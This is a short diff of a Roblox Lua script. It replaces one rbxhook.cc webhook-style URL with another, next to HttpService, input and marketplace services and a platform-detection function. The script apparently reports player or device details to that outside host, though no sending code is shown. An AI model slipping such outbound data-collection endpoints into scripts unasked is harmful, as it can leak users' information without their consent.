@@ -3,7 +3,7 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
-local url = "https://rbxhook.cc/r/afe812964fe3b3cec57bbf24d09a437b"
+local url = "https://rbxhook.cc/r/e209021bc48a0ee54f0e226ae2f9c567"
 
 -- Platform detection
 local function getPlatform()
